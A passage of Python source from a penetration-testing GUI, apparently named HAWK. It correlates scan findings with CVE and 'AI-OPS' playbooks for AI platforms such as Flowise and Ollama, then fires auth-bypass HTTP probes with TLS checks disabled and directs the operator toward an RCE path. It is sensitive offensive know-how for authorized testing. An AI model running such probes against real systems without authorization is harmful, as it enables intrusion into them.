            if kev is not None:
                marker = ("🔴 KEV·RANSOMWARE" if kev.known_ransomware
                          else "🔴 KEV")
                kb_title = f"{kb_title}   [{marker}]"
                kb_desc = f"⚠ {kev.badge()}\n{kev.summary_line()}\n\n{kb_desc}"
                severity = "critical"
            self.add_auto_finding(
                title=kb_title,
                description=kb_desc,
                severity=severity,
                source=f"{self._KB_SOURCE_PREFIX} ({entry_id})",
                port=port if isinstance(port, int) else None)
            try:
                kev_note = ""
                if kev is not None:
                    kev_note = ("  [CISA KEV — actively exploited"
                                + (" · ransomware]" if kev.known_ransomware
                                   else "]"))
                self.app.terminal.write(
                    f"  [!] CVE KB hit: {entry_id} ({entry.get('product','')}) — "
                    f"correlated finding pushed.{kev_note}", "warn")
            except Exception:
                pass

    # ─── AI-OPS Playbook correlation ──────────────────────────────────────

    def _aiops_correlate(self, title: str, description: str,
                          port: "int | None" = None,
                          source: str = "") -> None:
        """Sibling of _kb_correlate — looks up `(title, description)`
        against the AI-OPS registry (utils/aiops_playbooks) and pushes
        an "AI Ops Target — <tool>" finding when a signature hits.

        Source-prefix guard prevents the hook from re-entering on its
        own emissions OR on the CVE-KB ones (different prefix, same
        defensive principle).
        """
        from utils import aiops_playbooks as _ap
        if _ap.is_aiops_source(source):
            return
        # Don't double-fire on CVE-KB-emitted findings either — they
        # carry their own PoC already and would otherwise trigger the
        # AI-OPS hook off the product name in their title.
        if (source or "").startswith(self._KB_SOURCE_PREFIX):
            return
        hits = _ap.match(title, description)
        if not hits:
            return

        # Resolve target / scheme / port from the originating finding
        # the same way _kb_correlate does, so the AI-OPS finding lands
        # on the EXACT vhost+port that produced the fingerprint.
        import re as _re
        from urllib.parse import urlparse as _urlparse
        target = ""
        scheme = ""
        url_m = _re.search(
            r"(https?://[A-Za-z0-9._\-]+(?::\d+)?)",
            f"{title}\n{description}", _re.IGNORECASE)
        if url_m:
            try:
                pu = _urlparse(url_m.group(1))
                if pu.hostname:
                    target = pu.hostname
                    scheme = (pu.scheme or scheme).lower()
                    if pu.port and not port:
                        port = pu.port
            except Exception:
                pass
        if not target:
            try:
                sess = self.app.session_manager.current
                if sess:
                    target = (getattr(sess, "target_domain", "")
                              or getattr(sess, "target_ip", "")
                              or "").strip()
            except Exception:
                pass
        if not target and self._fp:
            try:
                target = (getattr(self._fp, "target", "")
                          or getattr(self._fp, "ip", "")) or ""
            except Exception:
                pass
        if not scheme:
            scheme = "http"
            blob_low = (title + " " + description).lower()
            if ("https" in blob_low or "ssl/http" in blob_low or
                    (port and int(port) in (443, 8443))):
                scheme = "https"

        for entry in hits:
            ap_title = _ap.make_finding_title(
                entry, scheme=scheme,
                target=target or "TARGET",
                port=port if isinstance(port, int) else None)
            ap_desc = _ap.render_finding_description(
                entry, scheme=scheme,
                target=target or "TARGET",
                port=port if isinstance(port, int) else None)
            self.add_auto_finding(
                title=ap_title,
                description=ap_desc,
                severity="critical",
                source=_ap.make_source(entry),
                port=port if isinstance(port, int) else None)
            try:
                self.app.terminal.write(
                    f"  [!] AI-OPS hit: {entry['name']} — "
                    f"playbook pushed to Target Intel.", "warn")
            except Exception:
                pass

    def _aiops_open_cve_search(self, finding: dict,
                                entry: dict) -> None:
        """Open the existing SEARCH CVEs picker (web mode) pre-filled
        with `<tool> <version>` for the AI-OPS finding's product.

        Version is taken from ``finding["_aiops_detected_version"]``
        (set by ``_aiops_run_bypass_probes`` when /api/version-style
        endpoints respond).  Empty string when no version was
        detected — keyword is just the tool name in that case.

        Routes through ``_show_search_picker`` so the operator sees
        the same dialog they're used to: 3 radios (NVD fingerprint /
        NVD custom / web custom).  Mode 3 is pre-selected.
        """
        from utils import aiops_playbooks as _ap
        ver = (finding.get("_aiops_detected_version") or "").strip()
        keyword = _ap.search_keyword(entry, ver)
        # The picker lives in TargetIntelAdminMixin (cousin mixin in
        # the same TargetIntelWidget).  All three callbacks come from
        # there too — ``_run_cve_search`` (fingerprint mode),
        # ``_run_cve_search_custom`` (NVD), ``_run_cve_search_on_web``
        # (browser tabs).
        self._show_search_picker(
            action_label="SEARCH CVEs",
            placeholder=(
                "e.g.  flowise 3.0.5    open-webui 0.3.13    "
                "ollama 0.1.32"),
            tip=(f"Pre-filled with the AI-OPS detected product. "
                 f"Edit if you want a different scope.  Web mode "
                 f"opens Google / GitHub Advisories / ExploitDB / "
                 f"Packet Storm in your browser."),
            run_fp=self._run_cve_search,
            run_custom=self._run_cve_search_custom,
            run_web=self._run_cve_search_on_web,
            default_keyword=keyword,
            default_mode="web")

    def _aiops_run_bypass_probes(self, finding: dict) -> None:
        """Fire every auth-bypass probe in the AI-OPS playbook entry
        attached to this finding.

        Runs on a worker thread (network I/O — up to ~5×8s).  Each
        probe writes ONE summary line to the terminal:
            ` /api/v1/CREDENTIALS  ->  HTTP 200 (4521B)  *** HIT ***`

        When any probe returns a status that suggests a successful
        bypass (200 or 201 — the registry's `expect` field is human
        prose, not a regex, so we use a simple heuristic), HAWK
        pushes a secondary CRITICAL finding so the operator sees a
        red card the next time they look at Target Intel.
        """
        from utils import aiops_playbooks as _ap
        terminal = self.app.terminal

        # Resolve the registry entry from the finding's source tag.
        src = finding.get("source") or ""
        # `AI-OPS KB (flowise)` → "flowise"
        m = re.search(r"\(([^)]+)\)", src)
        entry_id = m.group(1) if m else ""
        entry = next((e for e in _ap.AIOPS_REGISTRY
                      if e["id"] == entry_id), None)
        if entry is None:
            terminal.write(
                f"  [!] AI-OPS PROBES: registry entry "
                f"'{entry_id}' not found.", "error")
            return

        # Resolve target URL from the finding (Source URL line lands
        # in the description courtesy of render_finding_description).
        from urllib.parse import urlparse
        desc = finding.get("description") or ""
        url_m = re.search(
            r"https?://[A-Za-z0-9._\-]+(?::\d+)?", desc, re.IGNORECASE)
        if not url_m:
            terminal.write(
                "  [!] AI-OPS PROBES: no source URL in finding.",
                "error")
            return
        base = url_m.group(0)
        try:
            pu = urlparse(base)
            scheme = (pu.scheme or "http").lower()
            host = pu.hostname or ""
            port = pu.port or (443 if scheme == "https" else 80)
        except Exception:
            terminal.write(
                f"  [!] AI-OPS PROBES: malformed URL {base!r}",
                "error")
            return
        if not host:
            terminal.write(
                "  [!] AI-OPS PROBES: empty host in URL.", "error")
            return
        if port in (80, 443):
            origin = f"{scheme}://{host}"
        else:
            origin = f"{scheme}://{host}:{port}"

        probes = entry.get("auth_bypass_probes") or []
        if not probes:
            terminal.write(
                f"  [*] AI-OPS PROBES: {entry['name']} has no "
                f"probes defined.", "dim")
            return

        terminal.write(
            f"  [AI-OPS] {entry['name']} probes against {origin}/  "
            f"({len(probes)} request(s))", "info")

        # Worker thread.  Each probe = one urllib request with
        # 8s timeout, TLS verify off (lab-safe, see FETCH SOURCE).
        import threading as _th

        def _worker():
            import urllib.request as _ur
            import ssl as _ssl
            import json as _json
            results = []
            # Capture detected version from the response body of any
            # probe whose path equals the entry's `version_endpoint`
            # (or the conventional `/api/version` / `/version` ones).
            # Stored on the finding as `_aiops_detected_version` so
            # the SEARCH CVE button can pre-fill the keyword with
            # `<tool> <version>` instead of just `<tool>`.
            VERSION_RE = re.compile(
                r'"version"\s*:\s*"([^"]+)"', re.IGNORECASE)
            VERSION_PATHS = {
                (entry.get("version_endpoint") or "").rstrip("/"),
                "/api/version", "/version", "/api/v1/version",
                "/api/v1/info", "/api/info",
            } - {""}
            detected_version = ""
            for p in probes:
                path = p.get("path", "/")
                method = (p.get("method") or "GET").upper()
                label = p.get("label", path)
                hdrs = dict(p.get("headers") or {})
                hdrs.setdefault(
                    "User-Agent", "HAWK/AI-OPS-Probe")
                body = p.get("body")
                data_bytes = None
                if isinstance(body, str):
                    data_bytes = body.encode("utf-8")
                elif isinstance(body, dict):
                    data_bytes = _json.dumps(body).encode("utf-8")
                    hdrs.setdefault(
                        "Content-Type", "application/json")
                url = origin + path
                status = 0
                size = 0
                err = ""
                resp_body = b""
                try:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    req = _ur.Request(url, data=data_bytes,
                                       headers=hdrs, method=method)
                    with _ur.urlopen(req, timeout=8,
                                      context=ctx) as r:
                        resp_body = r.read()
                        status = r.status
                        size = len(resp_body)
                except Exception as e:
                    # urllib raises HTTPError for 4xx/5xx — pull the
                    # status anyway since that IS the answer.
                    status = getattr(e, "code", 0)
                    try:
                        resp_body = getattr(
                            e, "read", lambda: b"")()
                        size = len(resp_body)
                    except Exception:
                        size = 0
                    if not status:
                        err = str(e)[:80]
                # Version-extraction: only on successful responses to
                # known version paths.  Conservative regex (matches
                # the conventional `"version":"X.Y.Z"` JSON shape
                # used by Flowise, Open WebUI, ChromaDB, etc.).
                if (status in (200, 201) and resp_body
                        and path.rstrip("/") in VERSION_PATHS
                        and not detected_version):
                    try:
                        text_body = resp_body.decode(
                            "utf-8", errors="replace")
                        vm = VERSION_RE.search(text_body)
                        if vm:
                            detected_version = vm.group(1).strip()
                    except Exception:
                        pass
                results.append((path, method, label, status, size, err))

            # Persist the detected version on the finding so the
            # SEARCH CVE button picks it up next time it's clicked.
            if detected_version:
                try:
                    finding["_aiops_detected_version"] = detected_version
                except Exception:
                    pass

            # `hit` heuristic: 200 / 201 means the endpoint answered
            # without auth — that IS the bypass for the bypass probes
            # (and just "reachable" for fingerprint probes — both
            # interesting enough to flag).
            hits = [r for r in results if r[3] in (200, 201)]

            def _post():
                for (path, method, label, status, size, err) in results:
                    if err:
                        line = (f"     {method:<5} {path:<48}  "
                                f"->  ERROR: {err}")
                        terminal.write(line, "warn")
                    else:
                        marker = "  *** HIT ***" if status in (200, 201) \
                                  else ""
                        line = (f"     {method:<5} {path:<48}  "
                                f"->  HTTP {status:>3} ({size}B){marker}")
                        terminal.write(
                            line,
                            "success" if status in (200, 201)
                            else "dim")
                if hits:
                    # Push secondary finding so the operator can come
                    # back to it later without scrolling the terminal.
                    bullets = []
                    for (path, method, label, status, size, _e) in hits:
                        bullets.append(
                            f"  • {method} {path}  ->  "
                            f"HTTP {status} ({size}B)  —  {label}")
                    desc2 = (
                        f"Source URL: {origin}/\n"
                        f"Confirmed auth-bypass / open-endpoint "
                        f"probes against {entry['name']}:\n\n"
                        + "\n".join(bullets)
                        + "\n\nNext step: open the corresponding "
                        + "playbook step in the parent finding "
                        + f"(AI Ops Target — {entry['name']}) and "
                        + "follow the RCE-vector path.")
                    self.add_auto_finding(
                        title=(f"AI Ops — {entry['name']} bypass "
                               f"confirmed on {origin}/"),
                        description=desc2,
                        severity="critical",
                        source=_ap.make_source(entry))
                else:
                    terminal.write(
                        f"  [AI-OPS] {entry['name']} — no probe "
                        f"returned 200/201.  Endpoint requires auth, "
                        f"or bypass needs a different vector.",
                        "info")
            try:
                self.app.after(0, _post)
            except Exception:
                _post()

        _th.Thread(target=_worker, daemon=True).start()

    def scroll_to_run_id(self, run_id: str) -> None:
        """Called from app.navigate_to_run_id() — locate the first
        finding whose linked_run_id matches and scroll + highlight it.
        Used by the '🔑 creds'→'→ intel' navigation buttons to jump
        from a credential in the Credential Store to the related
        finding in Target Intel.

        If no finding matches, silently no-op (the user expected a
        match and didn't get one — log to terminal but don't throw)."""
        if not run_id:
            return
        target_finding = None
        for f in self._auto_findings:
            if f.get("linked_run_id") == run_id:
                target_finding = f
                break
        if target_finding is None:
            try:
                self.app.terminal.write(
                    f"  [*] No Target Intel finding with "
                    f"run_id={run_id}", "dim")
            except Exception:
                pass
            return
        # Re-render so the section is visible, then after the render
        # settles, scroll the card into view and pulse its border.
        try:
            self._render_auto_findings()
        except Exception:
            pass
        def _highlight():
            fr = target_finding.get("_frame_ref")
            if fr is None:
                return
            try:
                if not fr.winfo_exists():
                    return
                # Scroll parent CTkScrollableFrame so the card is
                # in view.  _parent_canvas is the internal tk.Canvas.
                parent_canvas = getattr(self._scroll,
                                        "_parent_canvas", None)
                if parent_canvas is not None:
                    try:
                        # fr.winfo_y() is relative to its IMMEDIATE
                        # parent, NOT to the canvas.  In this widget
                        # findings live inside body → section_frame →
                        # scroll, so fr.winfo_y() alone gives a small
                        # number (~10-30 px) that scrolls us to the
                        # top of the scroll region (i.e. the OS
                        # fingerprint card) instead of the actual
                        # finding.  Compute the ABSOLUTE y by using
                        # screen coordinates: widget's root y minus
                        # the canvas's root y = offset inside the
                        # canvas viewport; add the currently-scrolled
                        # amount to get the absolute content-space y.
                        fr.update_idletasks()
                        parent_canvas.update_idletasks()
                        bbox = parent_canvas.bbox("all")
                        if not bbox:
                            return
                        total = max(bbox[3] - bbox[1], 1)
                        # Current scroll fraction (top of viewport)
                        top_frac, _bot_frac = parent_canvas.yview()
                        current_px = top_frac * total
                        # Widget's y relative to canvas viewport
                        widget_root_y = fr.winfo_rooty()
                        canvas_root_y = parent_canvas.winfo_rooty()
                        rel_viewport_y = widget_root_y - canvas_root_y
                        # Absolute y in canvas content space
                        abs_y = current_px + rel_viewport_y
                        # Scroll so the widget lands ~20px from the
                        # top of the viewport (better than hugging
                        # the edge).
                        target_px = max(0, abs_y - 20)
                        parent_canvas.yview_moveto(target_px / total)
                    except Exception:
                        pass
                # Pulse border: green → normal after 1200ms
                orig_border = fr.cget("border_color")
                orig_width  = fr.cget("border_width")
                fr.configure(border_color=COLORS["text_green"],
                              border_width=3)
                def _revert():
                    try:
                        if fr.winfo_exists():
                            fr.configure(border_color=orig_border,
                                          border_width=orig_width)
                    except Exception:
                        pass
                self.after(1200, _revert)
            except Exception:
                pass
        self.after(120, _highlight)

    def _mark_finding_read(self, finding):
        """Clear the freshness highlight from a specific finding WITHOUT
        a full rerender.  We repaint just the affected card's border,
        destroy the "◆ NEW" badge + MARK READ button, and the rest of
        the auto_findings section stays untouched.

        Why in-place: _rerender_section("auto_findings") still rebuilds
        every finding card's widget tree (CTkFrame + Labels + Buttons)
        — when the user has 50+ findings that's ~400 widget creates
        which costs 1-2 seconds of visible flash.  Updating a single
        widget's border color is instantaneous."""
        if not finding.get("_fresh"):
            return
        finding.pop("_fresh", None)
        finding.pop("_update_note", None)
        self._apply_read_style(finding)
        _rb = getattr(self, "_refresh_new_badge", None)
        if _rb:
            _rb()

    def _apply_read_style(self, finding: dict) -> None:
        """Repaint an individual finding card to the non-fresh style.
        Safe to call regardless of whether the widgets still exist —
        any destroyed ref is skipped.  Called by the single-click
        MARK READ, the bulk MARK ALL READ, and the click-anywhere
        binding on each fresh card."""
        fr = finding.pop("_frame_ref", None)
        if fr is not None:
            try:
                if fr.winfo_exists():
                    fr.configure(
                        fg_color=COLORS["bg_card"],
                        border_width=0,
                        corner_radius=3,
                    )
            except Exception:
                pass
        badge = finding.pop("_badge_ref", None)
        if badge is not None:
            try:
                if badge.winfo_exists():
                    badge.destroy()
            except Exception:
                pass
        mbtn = finding.pop("_mark_btn_ref", None)
        if mbtn is not None:
            # Deferred destroy — the button callback that called us is
            # still on the call stack, and some Tk builds choke when the
            # widget is torn down from its own command.  after_idle runs
            # it once the current event finishes.
            try:
                if mbtn.winfo_exists():
                    mbtn.after_idle(lambda b=mbtn: b.winfo_exists()
                                    and b.destroy())
            except Exception:
                pass

    def _mark_all_findings_read(self):
        """Bulk-dismiss the fresh highlight on every finding in one click.
        Uses the same in-place widget update as the single-click path, so
        clearing 50 findings produces zero rerender flash."""
        touched = 0
        for f in self._auto_findings:
            if f.get("_fresh"):
                f.pop("_fresh", None)
                f.pop("_update_note", None)
                self._apply_read_style(f)
                touched += 1
        _rb = getattr(self, "_refresh_new_badge", None)
        if _rb:
            _rb()
        if touched == 0:
            try:
                self.app.terminal.write(
                    "  [*] Nothing to mark — no fresh findings.", "dim")
            except Exception:
                pass
            return
        try:
            self.app.terminal.write(
                f"  [*] Marked {touched} finding"
                f"{'s' if touched != 1 else ''} as read.", "dim")
        except Exception:
            pass

    def _show_pn_popup(self, target: str):
        from gui.dialogs import _make_win, _note_box, _btn_row, _btn, _safe_destroy
        win = _make_win(self, "Host Not Responding", 560, 320)
        ctk.CTkLabel(win, text="⚠  No Response to Any Probe",
                     font=_f("xl", True),
                     text_color=COLORS["text_red"]).pack(pady=(14,6))
        _note_box(win,
                  f"Target {target} did not respond to:\n"
                  "  • ICMP ping\n"
                  "  • TCP SYN on ports 1-1023\n"
                  "  • TCP ACK on ports 1-1023\n\n"
                  "Use NMAP Quick or Full from Port Scanning card\n"
                  "with -Pn already included — it will try anyway.",
                  COLORS["text_yellow"])
        row = _btn_row(win)
        _btn(row, "OK", lambda: _safe_destroy(win), primary=True)

    def _render_all(self):
        """Full rebuild of the Target Intel scroll.  Only call this when
        section *topology* changes (a section appears/disappears, reorder,
        session reload, tab switch-in).  For localized updates — marking
        a finding as read, changing a port's service — use
        _rerender_section() instead: it only touches the affected subtree
        and avoids the 1-2 second re-layout flash on large targets."""
        for w in self._scroll.winfo_children():
            w.destroy()
        # Track the grid row each section occupies so _rerender_section
        # can locate + replace a single subtree.  Grid rows are positional,
        # so replacing one row with a new widget at the same row Just
        # Works — the siblings keep their rows untouched.
        self._section_rows = {}
        row = 0
        if self._fp:
            self._section_rows["fingerprint"] = row
            row = self._render_fingerprint(row)
        if self._auto_findings:
            self._section_rows["auto_findings"] = row
            row = self._render_auto_findings_section(row)
        if self._exploits:
            self._section_rows["exploits"] = row
            row = self._render_exploits(row)

    def _rerender_section(self, name: str) -> None:
        """Destroy and rebuild a single section in place.  ~10-50× faster
        than _render_all because the other sections aren't recreated —
        they just stay on screen.  Section names: "fingerprint",
        "auto_findings", "exploits".  Falls back to _render_all() if the
        section's row isn't cached yet (first paint, or topology change)."""
        rows = getattr(self, "_section_rows", None)
        if not rows or name not in rows:
            self._render_all()
            return
        target_row = rows[name]
        # grid_slaves(row=N, column=0) returns the widget(s) at that row.
        # There should be exactly one — the section's outer CTkFrame.
        for w in self._scroll.grid_slaves(row=target_row, column=0):
            try:
                w.destroy()
            except Exception:
                pass
        # Re-render ONLY this section at the same row.  The _render_*
        # helpers already call .grid(row=target_row), so the widget ends
        # up where the destroyed one was.
        try:
            if name == "fingerprint" and self._fp:
                self._render_fingerprint(target_row)
            elif name == "auto_findings" and self._auto_findings:
                self._render_auto_findings_section(target_row)
            elif name == "exploits" and self._exploits:
                self._render_exploits(target_row)
        except Exception:
            # On any render error, fall back to a full rebuild — safer
            # than leaving the UI half-populated.
            self._render_all()

    def _render_fingerprint(self, start_row: int) -> int:
        fp       = self._fp
        os_color = (COLORS["text_green"] if fp.platform and not fp.ambiguous
                    else COLORS["text_yellow"])

        fr = ctk.CTkFrame(self._scroll, fg_color=COLORS["bg_secondary"],
                          border_color=os_color, border_width=1, corner_radius=4)
        fr.grid(row=start_row, column=0, sticky="ew", padx=8, pady=6)
        start_row += 1

        ctk.CTkLabel(fr, text="  OS FINGERPRINT",
                     font=_f("lg", True), text_color=os_color,
                     anchor="w").pack(fill="x", padx=10, pady=(8,2))

        # Base OS rows + NSE-harvested intel. The extra rows only show up
        # when we actually learned something (via smb-os-discovery,
        # rdp-ntlm-info, smb2-security-mode …) — otherwise the panel stays
        # as compact as it was before.
        base_rows = [
            ("Platform:",   fp.platform.capitalize() if fp.platform else "Unknown"),
            ("Version:",    fp.version or "—"),
            ("Confidence:", f"{fp.confidence}%" if fp.confidence else "—"),
        ]
        extra_rows = []
        if getattr(fp, "ntlm_product_version", ""):
            extra_rows.append(("NT Build:", fp.ntlm_product_version))
        if getattr(fp, "computer_name", ""):
            extra_rows.append(("Hostname:", fp.computer_name))
        if getattr(fp, "fqdn", ""):
            extra_rows.append(("FQDN:", fp.fqdn))
        if getattr(fp, "domain", ""):
            extra_rows.append(("Domain:", fp.domain))
        if getattr(fp, "smb_signing", ""):
            extra_rows.append(("SMB Signing:", fp.smb_signing.capitalize()))

        for label, value in base_rows + extra_rows:
            rf = ctk.CTkFrame(fr, fg_color="transparent")
            rf.pack(fill="x", padx=10, pady=1)
            ctk.CTkLabel(rf, text=f"  {label}",
                         font=_f("md"), text_color=COLORS["text_dim"],
                         width=100, anchor="w").pack(side="left")
            # Colour SMB signing by risk — "disabled" is a relay opening.
            val_color = COLORS["text_bright"]
            if label == "SMB Signing:":
                val_color = (COLORS["text_red"]    if "disabled" in value.lower()
                             else COLORS["text_yellow"] if "supported" in value.lower()
                             else COLORS["text_green"])
            ctk.CTkLabel(rf, text=value,
                         font=_f("md", True), text_color=val_color,
                         anchor="w").pack(side="left")

        if fp.ambiguous:
            msg = ("  ⚠  Ambiguous — try Service+Scripts or Vuln Scripts"
                   if _nmap_os_already_run(self.app)
                   else "  ⚠  Ambiguous — run NMAP OS Detection for better results")
            ctk.CTkLabel(fr, text=msg,
                         font=_f("md"), text_color=COLORS["text_yellow"],
                         anchor="w").pack(fill="x", padx=10, pady=2)
        elif not fp.platform:
            msg = ("  ⚠  OS not detected — target may be heavily filtered"
                   if _nmap_os_already_run(self.app)
                   else "  ⚠  OS not detected — run NMAP OS Detection")
            ctk.CTkLabel(fr, text=msg,
                         font=_f("md"), text_color=COLORS["text_yellow"],
                         anchor="w").pack(fill="x", padx=10, pady=2)

        # Edit OS button
        ctk.CTkButton(fr, text="✎ EDIT OS",
                      width=100, height=22, font=_f("sm", True),
                      fg_color=COLORS["bg_secondary"],
                      hover_color=COLORS["bg_card_hover"],
                      border_color=COLORS["border_dim"], border_width=1,
                      text_color=COLORS["text_dim"], corner_radius=3,
                      command=self._edit_os_dialog,
                      ).pack(anchor="w", padx=10, pady=(4,6))

        # Open ports
        if fp.open_ports:
            pf = ctk.CTkFrame(self._scroll, fg_color=COLORS["bg_secondary"],
                              border_color=COLORS["border_dim"],
                              border_width=1, corner_radius=4)
            pf.grid(row=start_row, column=0, sticky="ew", padx=8, pady=6)
            start_row += 1

            # Build a compact summary for the collapsed state
            svc_set = sorted({s for _, _, s, _ in fp.open_ports
                              if s and s.lower() not in
                              ("unknown", "tcpwrapped", "")})
            ports_summary = ", ".join(
                str(p) for p, _, _, _ in fp.open_ports)
            if len(ports_summary) > 60:
                ports_summary = ports_summary[:57] + "…"
            counts_text = (f"{', '.join(svc_set[:6])}"
                           + (" …" if len(svc_set) > 6 else ""))

            body, collapsed = self._make_collapsible_header(
                pf, "ports",
                f"OPEN PORTS  ({len(fp.open_ports)} detected)",
                COLORS["text_green"], counts_text)

            if collapsed:
                # Show a one-line summary even when collapsed
                ctk.CTkLabel(pf, text=f"  {ports_summary}",
                             font=_f("sm"), text_color=COLORS["text_dim"],
                             anchor="w").pack(fill="x", padx=10, pady=(0, 6))
                return start_row

            from utils.config import SERVICE_PORT_MAP
            for i_port, (port, proto, svc, banner) in enumerate(fp.open_ports):
                # Normalize service name for well-known "disguised" ports:
                # 5985/5986 often reported as "microsoft-httpapi" or "http"
                # but they are WinRM. 593 is RPC-over-HTTP, not browsable.
                # Fixing these here means non-standard flag and the tool
                # routing (gobuster/ffuf/nikto) all see the right service.
                svc = self._canonical_service(port, proto, svc, banner)
                # Port card — two rows: info + actions
                port_card = ctk.CTkFrame(body, fg_color=COLORS["bg_card"],
                                         border_color=COLORS["border_dim"],
                                         border_width=1, corner_radius=3)
                port_card.pack(fill="x", padx=8, pady=2)

                # Row 1: protocol, port, service, copy button
                row1 = ctk.CTkFrame(port_card, fg_color="transparent")
                row1.pack(fill="x", padx=6, pady=(4,2))

                ctk.CTkLabel(row1,
                             text=f"{proto.upper():3}",
                             font=_f("md", True), text_color=COLORS["text_green"],
                             width=36, anchor="w").pack(side="left")
                ctk.CTkLabel(row1,
                             text=f"{port}",
                             font=_f("md", True), text_color=COLORS["text_green"],
                             width=56, anchor="w").pack(side="left")
                ctk.CTkLabel(row1,
                             text=svc,
                             font=_f("md", True), text_color=COLORS["text_bright"],
                             width=140, anchor="w").pack(side="left")

                # Copy button for port/service
                ctk.CTkButton(
                    row1, text="📋", width=28, height=20,
                    font=_f("sm"),
                    fg_color=COLORS["bg_secondary"],
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["border_dim"], border_width=1,
                    text_color=COLORS["text_dim"], corner_radius=2,
                    command=lambda p=port, s=svc: self._copy_port_info(p, s),
                ).pack(side="left", padx=4)

                default = SERVICE_PORT_MAP.get(svc.lower().split("/")[0])
                is_nonstandard = (default and port != default)

                if is_nonstandard:
                    ctk.CTkLabel(row1,
                                 text=f"⚠ non-standard (default:{default})",
                                 font=_f("sm"), text_color=COLORS["text_yellow"],
                                 anchor="w").pack(side="left", padx=4)

                if banner:
                    ctk.CTkLabel(row1, text=banner[:40],
                                 font=_f("sm"), text_color=COLORS["text_dim"],
                                 anchor="w").pack(side="left", padx=6)

                # Row 2: actions (always visible)
                row2 = ctk.CTkFrame(port_card, fg_color="transparent")
                row2.pack(fill="x", padx=6, pady=(0,4))

                # Netcat button — always visible
                ctk.CTkButton(
                    row2, text="🔌 NETCAT",
                    width=90, height=20,
                    font=_f("sm", True),
                    fg_color=COLORS["bg_secondary"],
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["text_yellow"], border_width=1,
                    text_color=COLORS["text_yellow"], corner_radius=2,
                    command=lambda p=port, s=svc: self._netcat_verify(p, s),
                ).pack(side="left", padx=(0,4))

                # Change service button — always visible
                ctk.CTkButton(
                    row2, text="✎ CHANGE SERVICE",
                    width=140, height=20,
                    font=_f("sm", True),
                    fg_color=COLORS["bg_secondary"],
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["border_dim"], border_width=1,
                    text_color=COLORS["text_dim"], corner_radius=2,
                    command=lambda p=port, pr=proto, s=svc, b=banner, idx=i_port:
                        self._change_service_dialog(p, pr, s, b, idx),
                ).pack(side="left", padx=4)

                # CONNECT IN TERMINAL — only if the service is connectable
                if self._terminal_cmd_for(svc, port):
                    ctk.CTkButton(
                        row2, text="💻 CONNECT",
                        width=90, height=20,
                        font=_f("sm", True),
                        fg_color=COLORS["bg_secondary"],
                        hover_color=COLORS["bg_card_hover"],
                        border_color=COLORS["border_green"], border_width=1,
                        text_color=COLORS["text_green"], corner_radius=2,
                        command=lambda p=port, s=svc:
                            self._connect_in_terminal(p, s),
                    ).pack(side="left", padx=4)

                # PROBE — quick socket banner grab
                ctk.CTkButton(
                    row2, text="🔎 PROBE",
                    width=80, height=20,
                    font=_f("sm", True),
                    fg_color=COLORS["bg_secondary"],
                    hover_color=COLORS["bg_card_hover"],
                    border_color=COLORS["border_dim"], border_width=1,
                    text_color=COLORS["text_cyan"], corner_radius=2,
                    command=lambda p=port, s=svc: self._quick_probe(p, s),
                ).pack(side="left", padx=4)

                # CMDS — open the cheatsheet dialog (FEATURE-B v1).
                # Only visible for services with a curated cheatsheet
                # (MySQL/MariaDB, PostgreSQL, MSSQL, MongoDB, Redis).
                # The dialog is non-modal so it stays open alongside
                # the Connect xterm — the operator copies commands
                # via single-click COPY buttons.
                if self._cheatsheet_key_for(svc):
                    ctk.CTkButton(
                        row2, text="📋 CMDS",
                        width=80, height=20,
                        font=_f("sm", True),
                        fg_color=COLORS["bg_secondary"],
                        hover_color=COLORS["bg_card_hover"],
                        border_color=COLORS["text_yellow"],
                        border_width=1,
                        text_color=COLORS["text_yellow"],
                        corner_radius=2,
                        command=lambda p=port, s=svc:
                            self._open_cheatsheet(p, s),
                    ).pack(side="left", padx=4)
            ctk.CTkLabel(body, text="", font=_f("sm")).pack(pady=2)

        return start_row

    def _make_collapsible_header(self, parent, section_id: str,
                                 title: str, color: str,
                                 counts_summary: str = "") -> tuple:
        """Build a clickable header row for a collapsible section.

        Returns (body_frame, is_collapsed). Caller packs content widgets
        into body_frame when is_collapsed is False.
        """
        is_collapsed = self._collapsed.get(section_id, False)
        chevron      = "▶" if is_collapsed else "▼"

        hdr = ctk.CTkFrame(parent, fg_color="transparent")
        hdr.pack(fill="x", padx=4, pady=(8, 2))

        def _toggle():
            self._collapsed[section_id] = not self._collapsed.get(
                section_id, False)
            # Only rerender the section being collapsed/expanded — the
            # others don't change visually and re-rendering them is
            # what caused the 1-2s flash that the user reported.
            section_map = {
                "fp":       "fingerprint",
                "vulns":    "auto_findings",
                "exploits": "exploits",
            }
            tgt = section_map.get(section_id)
            if tgt and tgt in getattr(self, "_section_rows", {}):
                self._rerender_section(tgt)
            else:
                self._render_all()

        btn = ctk.CTkButton(
            hdr, text=f"  {chevron}  {title}",
            anchor="w", font=_f("lg", True),
            fg_color="transparent", hover_color=COLORS["bg_card_hover"],
            text_color=color, corner_radius=3, height=28,
            command=_toggle)
        btn.pack(side="left", fill="x", expand=True, padx=4)

        if counts_summary:
            ctk.CTkLabel(hdr, text=counts_summary,
                         font=_f("sm"), text_color=COLORS["text_muted"],
                         anchor="e").pack(side="right", padx=8)

        body = ctk.CTkFrame(parent, fg_color="transparent")
        if not is_collapsed:
            body.pack(fill="x", padx=4, pady=(0, 6))
        return body, is_collapsed

    def _render_auto_findings_section(self, start_row: int) -> int:
        if not self._auto_findings:
            return start_row

        sev_colors = {
            "critical": COLORS["text_red"],
            "high":     COLORS["text_orange"],
            "medium":   COLORS["text_yellow"],
            "low":      COLORS["text_green"],
            "info":     COLORS["text_dim"],
        }
        sev_rank = {"critical": 0, "high": 1, "medium": 2,
                    "low": 3, "info": 4}

        # Count findings per severity for the header badge.
        counts = {k: 0 for k in sev_rank}
        for f in self._auto_findings:
            s = (f.get("severity") or "info").lower()
            counts[s] = counts.get(s, 0) + 1
        badges = []
        for sev in ("critical", "high", "medium", "low", "info"):
            if counts.get(sev, 0):
                badges.append(f"{counts[sev]} {sev}")
        summary = " · ".join(badges)

        af = ctk.CTkFrame(self._scroll, fg_color=COLORS["bg_secondary"],
                          border_color=COLORS["text_red"],
                          border_width=1, corner_radius=4)
        af.grid(row=start_row, column=0, sticky="ew", padx=8, pady=6)
        start_row += 1

        body, collapsed = self._make_collapsible_header(
            af, "vulns",
            f"AUTO-DISCOVERED VULNERABILITIES  "
